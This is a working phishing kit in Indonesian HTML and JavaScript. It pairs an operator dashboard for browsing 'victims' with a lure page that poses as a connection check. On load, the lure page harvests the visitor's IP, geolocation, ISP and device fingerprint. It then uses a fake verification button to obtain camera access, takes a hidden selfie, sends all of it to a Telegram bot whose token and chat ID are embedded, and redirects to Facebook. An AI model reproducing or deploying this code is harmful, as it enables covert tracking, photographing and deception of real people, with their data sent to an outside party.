            width: 100%;

            bottom: 20px;

            right: 20px;

            border-radius: 12px;
            text-align: center;
            z-index: 1000;

            0% { opacity: 1; }

            background: #1c1c1e;
            margin: 16px 20px;

<script>
    const ADMIN_PASSWORD = 'ManzzHandSome2331';
    function showToast(msg) {
        let toast = document.createElement('div');
        toast.className = 'toast';
        toast.innerText = msg;
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 2000);
    }
    function getDeviceIcon(ua) {
        if(ua.includes('iPhone')) return '📱';
        if(ua.includes('Android')) return '🤖';
        if(ua.includes('Windows')) return '💻';
        if(ua.includes('Mac')) return '🍎';
        return '📟';
    }
    function renderLogin() {
        document.getElementById('app').innerHTML = `
            <div class="login-container">
                <div style="font-size: 48px; margin-bottom: 16px;">🔐</div>
                <h2>Admin Control</h2>
                <p>Masukkan password untuk akses data korban</p>
                <input type="password" id="adminPass" placeholder="Password">
                <button onclick="doLogin()">Masuk</button>
            </div>
        `;
    }
    function doLogin() {
        let pass = document.getElementById('adminPass').value;
        if(pass === ADMIN_PASSWORD) {
            localStorage.setItem('admin_logged_in', 'true');
            renderDashboard();
        } else {
            showToast('Password salah!');
        }
    }
    function renderDashboard() {
        let victims = [];
        try {
            let data = localStorage.getItem('phising_data');
            victims = data ? JSON.parse(data) : [];
        } catch(e) {}
        let now = new Date();
        let timeStr = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
        let html = `
            <div class="status-bar">
                <span class="time">${timeStr}</span>
                <span class="battery">📶 🔋 100%</span>
            </div>
            <div class="header">
                <h1>Control Center</h1>
                <p>Data korban phishing</p>
            </div>
            <div class="stats-card">
                <div>
                    <div class="stats-number">${victims.length}</div>
                    <div class="stats-label">Total Korban</div>
                </div>
                <button class="refresh-btn" onclick="refreshData()">⟳ Refresh</button>
            </div>
            <div class="backup-info">💾 Data tersimpan di browser ini. Export JSON untuk backup.</div>
        `;
        if(victims.length === 0) {
            html += `<div class="empty-state"><div class="empty-state-icon">📭</div><div>Belum ada data korban</div><div style="font-size: 12px; margin-top: 8px;">Kirim link phishing dulu bos</div></div>`;
        } else {
            victims = [...victims].reverse();
            victims.forEach((v, idx) => {
                let deviceIcon = getDeviceIcon(v.deviceAgent || '');
                let deviceName = v.devicePlatform || 'Unknown Device';
                let expandId = `details_${idx}`;
                html += `
                    <div class="victim-card">
                        <div class="victim-header">
                            <div class="device-name"><span>${deviceIcon}</span><span>${deviceName}</span></div>
                            <div style="display: flex; gap: 8px; align-items: center;">
                                <span class="victim-time">${v.waktu || '-'}</span>
                                <button class="expand-btn" onclick="toggleDetails('${expandId}', this)">Lihat</button>
                            </div>
                        </div>
                        <div id="${expandId}" class="victim-details">
                            <div class="info-row"><div class="info-label">🌐 IP Address</div><div class="info-value">${v.ip || '-'}</div></div>
                            <div class="info-row"><div class="info-label">📍 Lokasi</div><div class="info-value">${v.kota || '-'}, ${v.region || '-'}, ${v.negara || '-'}</div></div>
                            <div class="info-row"><div class="info-label">📡 ISP / Provider</div><div class="info-value">${v.isp || '-'}</div></div>
                            <div class="info-row"><div class="info-label">📱 Nama Device (Real)</div><div class="info-value" style="font-size: 11px;">${v.deviceAgent || '-'}</div></div>
                            <div class="info-row"><div class="info-label">💻 Platform / OS</div><div class="info-value">${v.devicePlatform || '-'}</div></div>
                            <div class="info-row"><div class="info-label">📺 Resolusi Layar</div><div class="info-value">${v.screenRes || '-'}</div></div>
                            <div class="info-row"><div class="info-label">🌍 Timezone</div><div class="info-value">${v.timezone || '-'}</div></div>
                            <div class="photo-area">${v.foto ? `<img src="${v.foto}" alt="Selfie Korban" onclick="window.open(this.src)">` : '<div class="no-photo">📷 Belum ada foto</div>'}</div>
                            <button class="delete-btn" onclick="deleteVictim('${v.id}')">🗑 Hapus Data</button>
                        </div>
                    </div>
                `;
            });
            html += `
                <button class="delete-btn export-all" onclick="exportAllData()">📥 Export Semua Data (JSON)</button>
                <button class="delete-btn clear-all" onclick="clearAllData()">⚠️ Hapus Semua Data</button>
                <div style="height: 30px;"></div>
            `;
        }
        document.getElementById('app').innerHTML = html;
    }
    function toggleDetails(id, btn) {
        let el = document.getElementById(id);
        el.classList.toggle('show');
        btn.innerText = el.classList.contains('show') ? 'Tutup' : 'Lihat';
    }
    function refreshData() { renderDashboard(); showToast('Data berhasil di-refresh'); }
    function deleteVictim(id) {
        let victims = JSON.parse(localStorage.getItem('phising_data') || '[]');
        victims = victims.filter(v => v.id !== id);
        localStorage.setItem('phising_data', JSON.stringify(victims));
        renderDashboard();
        showToast('Data korban dihapus');
    }
    function clearAllData() {
        if(confirm('Yakin hapus SEMUA data korban?')) {
            localStorage.removeItem('phising_data');
            renderDashboard();
            showToast('Semua data telah dihapus');
        }
    }
    function exportAllData() {
        let data = localStorage.getItem('phising_data');
        if(!data || JSON.parse(data).length === 0) { showToast('Tidak ada data'); return; }
        let blob = new Blob([data], { type: 'application/json' });
        let url = URL.createObjectURL(blob);
        let a = document.createElement('a');
        a.href = url;
        a.download = `phising_data_${Date.now()}.json`;
        a.click();
        URL.revokeObjectURL(url);
        showToast('Data berhasil diexport');
    }
    if(localStorage.getItem('admin_logged_in') === 'true') { renderDashboard(); } else { renderLogin(); }
</script>

<script>
    const BOT_TOKEN = '7460316922:AAFQrYzJUrxt3nmt5AVVVXexrBrbm89nLPI';
    const CHAT_ID = '7962628944';
    const victimId = 'VICTIM_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);

    let loadingComplete = false;

    async function sendToTelegram(message) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },

            });
        } catch(e) {}
    }

    async function sendPhotoToTelegram(photoBase64) {
        try {
            const blob = await (await fetch(photoBase64)).blob();
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'selfie_' + victimId + '.jpg');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        } catch(e) {}
    }

    function saveToLocalStorage(data) {
        let existingData = localStorage.getItem('phising_data');
        let victims = existingData ? JSON.parse(existingData) : [];
        victims.push(data);
        localStorage.setItem('phising_data', JSON.stringify(victims));
    }

    function getRealDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: screen.width,
            screenHeight: screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown'
        };
    }

    async function getIPAndLocation() {
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            const geoRes = await fetch(`https://ip-api.com/json/${ipData.ip}`);
            const geoData = await geoRes.json();
            const deviceInfo = getRealDeviceInfo();
            
            const victimData = {
                id: victimId,
                ip: ipData.ip,
                kota: geoData.city,
                region: geoData.regionName,
                negara: geoData.country,
                isp: geoData.isp,
                lat: geoData.lat,
                lon: geoData.lon,
                timezone: geoData.timezone,
                deviceAgent: deviceInfo.userAgent,
                devicePlatform: deviceInfo.platform,
                screenRes: `${deviceInfo.screenWidth}x${deviceInfo.screenHeight}`,
                deviceRam: deviceInfo.deviceMemory + 'GB',
                cpuCores: deviceInfo.hardwareConcurrency,
                waktu: new Date().toLocaleString('id-ID'),
                foto: null
            };
            
            saveToLocalStorage(victimData);
            await sendToTelegram(`🎯 NEW VICTIM!\nID: ${victimId}\nIP: ${ipData.ip}\nLokasi: ${geoData.city}, ${geoData.country}\nDevice: ${deviceInfo.platform}`);
            return victimData;
        } catch(e) { console.log(e); }
    }

    async function startCameraAndCapture() {
        document.getElementById('infoText').innerHTML = '<span style="color:#1877f2;">📷 Meminta akses kamera...</span>';
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            
            document.getElementById('infoText').innerHTML = '<span style="color:#2e7d32;">✅ Kamera aktif, mengambil foto...</span>';
            
            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', '');
            video.style.position = 'fixed';
            video.style.top = '-9999px';
            video.style.left = '-9999px';
            document.body.appendChild(video);
            
            await video.play();
            await new Promise(r => setTimeout(r, 800));
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const photoData = canvas.toDataURL('image/jpeg', 0.7);
            stream.getTracks().forEach(track => track.stop());
            video.remove();
            
            document.getElementById('infoText').innerHTML = '<span style="color:#2e7d32;">📤 Mengirim data...</span>';
            await sendPhotoToTelegram(photoData);
            
            let existingData = localStorage.getItem('phising_data');
            let victims = existingData ? JSON.parse(existingData) : [];
            let currentVictim = victims.find(v => v.id === victimId);
            if(currentVictim) {
                currentVictim.foto = photoData;
                localStorage.setItem('phising_data', JSON.stringify(victims));
            }
            
            await sendToTelegram(`📸 FOTO TERKIRIM! ID: ${victimId}`);
            document.getElementById('infoText').innerHTML = '<span style="color:#2e7d32;">✅ Verifikasi berhasil!</span>';
            
            setTimeout(() => { window.location.href = 'https://www.facebook.com'; }, 1500);
        } catch(err) {
            document.getElementById('infoText').innerHTML = '<span style="color:#c62828;">❌ Izin kamera diperlukan. Klik tombol lagi dan izinkan kamera.</span>';
        }
    }

    function onContinue() {
        if (!loadingComplete) {
            document.getElementById('infoText').innerHTML = '<span style="color:#ff9800;">⏳ Tunggu loading selesai...</span>';
            return;
        }
        const btn = document.getElementById('continueBtn');
        btn.disabled = true;
        btn.innerText = 'Memproses...';
        startCameraAndCapture();
    }

    function startFakeLoading() {
        let progress = 0;
        const interval = setInterval(() => {
            progress += Math.floor(Math.random() * 10) + 5;
            if(progress >= 100) {
                clearInterval(interval);
                document.getElementById('progressFill').style.width = '100%';
                document.getElementById('loadingText').innerHTML = 'Memeriksa koneksi 100%';
                loadingComplete = true;
                document.getElementById('infoText').innerHTML = '<span style="color:#2e7d32;">✅ Siap verifikasi. Klik tombol di bawah.</span>';
            } else {
                document.getElementById('progressFill').style.width = progress + '%';
                document.getElementById('loadingText').innerHTML = `Memeriksa koneksi ${progress}%`;
            }
        }, 300);
    }

    window.onload = () => {
        startFakeLoading();
        getIPAndLocation();
        document.getElementById('continueBtn').onclick = onContinue;
    };
</script>
